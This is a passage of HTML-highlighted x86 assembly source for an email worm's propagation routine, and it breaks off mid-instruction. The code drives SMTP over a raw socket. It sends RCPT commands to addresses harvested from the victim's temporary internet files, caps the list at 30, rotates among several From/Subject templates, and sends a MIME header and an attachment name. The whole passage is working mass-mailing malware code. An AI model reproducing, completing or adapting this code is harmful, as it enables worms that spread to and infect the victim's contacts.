    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAILFROM1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mfromok</span><span class="sc0">
</span><span class="sc5">mfrom</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">64h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">mfrom2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfMailFrom2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAILFROM2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mfromok</span><span class="sc0">
</span><span class="sc5">mfrom2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">96h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">mfrom3</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfMailFrom3</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAILFROM3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mfromok</span><span class="sc0">
</span><span class="sc5">mfrom3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">0c8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">mfrom4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfMailFrom4</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAILFROM4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mfromok</span><span class="sc0">
</span><span class="sc5">mfrom4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfMailFrom5</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAILFROM5</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">mfromok</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SOCKET_ERR</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__recv</span><span class="sc0">              </span><span class="sc1">;get server message:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SOCKET_ERR</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetBuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">" 052"</span><span class="sc0">      </span><span class="sc1">;is 250 ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc1">;send RCPT command</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMailAddresses</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NumberOfMailAddresses</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">MailsFromFiles</span><span class="sc0">
</span><span class="sc5">@NxtAdd</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfRcpt</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RCPT</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;send start of RCPT command</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">AddSize</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;get email address size</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">AddSize</span><span class="sc0"> 
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;pointer to email addresses array</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;move to next address</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;send address</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfEndRcpt</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EndOfRCPT</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;send the end or rcpt command</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__recv</span><span class="sc0">              </span><span class="sc1">;get server message</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@NxtAdd</span><span class="sc0">             </span><span class="sc1">;and move to next mail address</span><span class="sc0">
</span><span class="sc5">MailsFromFiles</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;send mails to ppl that we found in temporary internet files</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NumberOfEmails</span><span class="sc4">],</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">_1___</span><span class="sc0">               </span><span class="sc1">;is number of mails &gt; 40 ?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NumberOfEmails</span><span class="sc4">],</span><span class="sc2">1eh</span><span class="sc0">  </span><span class="sc1">;send 30 emails</span><span class="sc0">
</span><span class="sc5">_1___</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NumberOfEmails</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;number of mails</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MailsMemory</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;pointer to mails array</span><span class="sc0">
</span><span class="sc5">@nM</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;next mail</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfRcpt</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RCPT</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;send start of RCPT command</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">Csize</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Csize</span><span class="sc0">               </span><span class="sc1">;calc mail address size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;restore pointer to mail address</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;move to next email</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfEndRcpt</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EndOfRCPT</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__recv</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@nM</span><span class="sc0">
    </span><span class="sc1">;send data command</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfData</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__DATA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SOCKET_ERR</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc1">;get server message</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__recv</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SOCKET_ERR</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetBuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">" 453"</span><span class="sc0">  </span><span class="sc1">;is 354 ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc1">;send from and subject</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">32h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_fs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfFromAndSubject1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FromAndSubject1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">smimeh</span><span class="sc0">  
</span><span class="sc5">_fs</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">64h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_fs2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfFromAndSubject2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FromAndSubject2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">smimeh</span><span class="sc0">  
</span><span class="sc5">_fs2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">96h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_fs3</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfFromAndSubject3</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FromAndSubject3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">smimeh</span><span class="sc0">
</span><span class="sc5">_fs3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">0c8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_fs4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfFromAndSubject4</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FromAndSubject4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">smimeh</span><span class="sc0">
</span><span class="sc5">_fs4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfFromAndSubject5</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FromAndSubject5</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">smimeh</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;send the mime header</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfMessageMimeHeader</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageMimeHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SOCKET_ERR</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc1">;send message and attachment name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">32h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ma</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfMessageAndFileName1</span><span class="sc0">
